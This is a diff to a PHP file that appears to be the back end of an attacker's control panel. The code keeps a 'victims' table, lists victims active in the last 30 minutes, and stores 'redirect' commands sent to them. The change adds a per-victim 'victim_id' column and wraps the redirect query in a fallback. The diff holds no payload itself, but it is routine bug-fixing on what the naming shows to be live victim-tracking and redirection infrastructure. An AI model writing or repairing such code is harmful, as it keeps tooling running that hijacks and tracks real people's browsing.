@@ -107,6 +107,18 @@ $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
 )";
 $db->exec($create_table);
 
+// FIX: Ensure victim_id column exists in redirect_commands table
+try {
+    $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'redirect_commands' AND column_name = 'victim_id'");
+    if ($check_column->rowCount() == 0) {
+        $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_id INTEGER DEFAULT NULL";
+        $db->exec($alter_table);
+        error_log("Added victim_id column to redirect_commands table");
+    }
+} catch (Exception $e) {
+    error_log("Column check error: " . $e->getMessage());
+}
+
 // Create victims table if not exists
 $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
     id SERIAL PRIMARY KEY,
@@ -121,10 +133,17 @@ $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
 )";
 $db->exec($create_victims_table);
 
-// Get current redirect
-$query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
-$stmt = $db->query($query);
-$current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
+// Get current redirect - FIXED VERSION
+try {
+    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
+    $stmt = $db->query($query);
+    $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
+} catch (PDOException $e) {
+    // If victim_id column doesn't exist yet, get without filtering
+    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
+    $stmt = $db->query($query);
+    $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
+}
 $current_redirect = $current_redirect ? $current_redirect['target'] : 'None';
 
 // Get active victims (last 30 minutes)
